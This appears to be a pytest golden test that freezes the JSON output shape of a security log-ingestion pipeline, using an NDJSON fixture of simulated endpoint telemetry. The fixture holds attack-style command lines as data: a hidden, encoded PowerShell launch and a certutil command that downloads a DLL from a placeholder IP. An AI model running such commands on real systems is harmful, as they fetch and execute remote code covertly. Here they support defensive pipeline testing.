"""Lane-A · Wire Contract Freeze (T2 golden).

Freezes the JSON shape produced by the full Lane-A pipeline
(Intake → Collect → Parse → Normalize → Aggregate → Understand) for
the CrowdStrike-shape NDJSON fixture in
``test_iue_preview_ndjson_wire_shape.py``.

This is the **frontend contract**.  Any Stage-1 change that alters
the wire shape MUST update this golden intentionally.

Recapture (only for owner-approved intentional changes):
    T1_GOLDEN_UPDATE=1 pytest tests/canonical/stage1_goldens/test_t2_lane_a_wire_contract.py
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from tests.canonical.stage1_goldens._harness import compare_or_capture


_FIXTURE_NDJSON = b'''\
{"event_time":"2026-02-14T12:00:00.010Z","host":"srv-01","user":"jsmith","action":"exec","category":"process","CommandLine":"powershell -nop -w hidden -enc SGVsbG8=","src_ip":"10.0.0.1","dst_ip":"185.220.101.7","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"event_time":"2026-02-14T12:00:00.240Z","host":"srv-01","user":"jsmith","action":"exec","category":"process","CommandLine":"powershell -nop -w hidden -enc SGVsbG8=","src_ip":"10.0.0.1","dst_ip":"185.220.101.7","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"event_time":"2026-02-14T12:00:00.870Z","host":"srv-01","user":"jsmith","action":"exec","category":"process","CommandLine":"powershell -nop -w hidden -enc SGVsbG8=","src_ip":"10.0.0.1","dst_ip":"185.220.101.7","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"event_time":"2026-02-14T12:00:05.100Z","host":"srv-01","user":"jsmith","action":"file_write","category":"file","CommandLine":"certutil.exe -f urlcache http://198.51.100.20/x.dll","src_ip":"10.0.0.1","dst_ip":"198.51.100.20","file_path":"C:\\\\Windows\\\\Temp\\\\x.dll","sha256":"a" }
{"event_time":"2026-02-14T12:00:07.500Z","host":"srv-02","user":"rjones","action":"network_connect","category":"network","src_ip":"10.0.0.2","dst_ip":"198.51.100.20","dst_port":"443"}
{"event_time":"2026-02-14T12:00:08.220Z","host":"srv-02","user":"rjones","action":"network_connect","category":"network","src_ip":"10.0.0.2","dst_ip":"198.51.100.20","dst_port":"443"}
{"malformed json line, missing quotes and braces}
{"event_time":"2026-02-14T12:00:15.000Z","host":"srv-03","user":"admin","action":"login_success","category":"identity","src_ip":"203.0.113.99","username":"admin"}
'''


def _run_lane_a(monkeypatch):
    monkeypatch.setenv("IUE_STRUCTURED_LANE", "on")
    from services.iue.intake import intake
    from services.iue.collectors.log_collector import collect
    from services.iue.parsers.ndjson_parser import iter_records
    from services.iue.normalizers.field_map import normalize
    from services.iue.aggregator import aggregate
    from services.iue.understanding import understand_structured

    d = intake(_FIXTURE_NDJSON, allow_prev_fallback=True)
    raw = collect(_FIXTURE_NDJSON, mime="application/x-ndjson",
                    input_id=d.input_id, tenant_id=d.tenant_id,
                    upstream=d.provenance)
    parsed = list(iter_records(raw))
    ok_r = [p for p in parsed if p.parse_status == "ok"]
    bad_r = [p for p in parsed if p.parse_status != "ok"]
    normalized = [normalize(p) for p in ok_r]
    events = aggregate(normalized)
    fragment = understand_structured(events)
    return {
        "intake_decision": d.to_dict(),
        "raw_payload":     raw.to_dict(),
        "logical_events":  [ev.to_dict() for ev in events],
        "malformed":       [p.to_dict() for p in bad_r],
        "report_extraction_fragment": fragment,
    }


def test_t2_lane_a_wire_contract_frozen(monkeypatch):
    """The full wire shape (all keys, all types, all ordering) is
    frozen.  Timestamps and IDs are scrubbed by the harness so the
    golden survives across runs."""
    wire = _run_lane_a(monkeypatch)
    compare_or_capture("t2_lane_a_wire_contract", wire)


def test_t2_wire_contract_key_surface_stable(monkeypatch):
    """Explicit key surface — the frontend contract.  Adds a redundant
    but human-readable guard beyond the byte-golden."""
    wire = _run_lane_a(monkeypatch)

    assert set(wire.keys()) == {
        "intake_decision", "raw_payload", "logical_events",
        "malformed", "report_extraction_fragment",
    }

    # IntakeDecision key surface
    assert set(wire["intake_decision"].keys()) == {
        "confidence", "discovery_depth", "flag_state", "ida_class",
        "input_id", "iue_type", "kind", "lane", "parent_input_id",
        "provenance", "reasons", "tenant_id",
    }

    # LogicalEvent key surface (the primary UI contract)
    for ev in wire["logical_events"]:
        assert set(ev.keys()) == {
            "canonical_fields", "count", "event_id", "first_seen",
            "input_id", "last_seen", "provenance", "record_refs",
            "source_file_id", "tenant_id", "variability",
        }

    # Provenance key surface (composed from canonical.ssot.models.Provenance)
    for ev in wire["logical_events"]:
        assert set(ev["provenance"].keys()) == {
            "engine", "version", "at", "upstream_evidence_ids",
        }

    # report_extraction fragment key surface (additive keys per STEP 3 §3.5)
    assert set(wire["report_extraction_fragment"].keys()) == {
        "logical_events", "logical_event_count", "logical_record_total",
    }
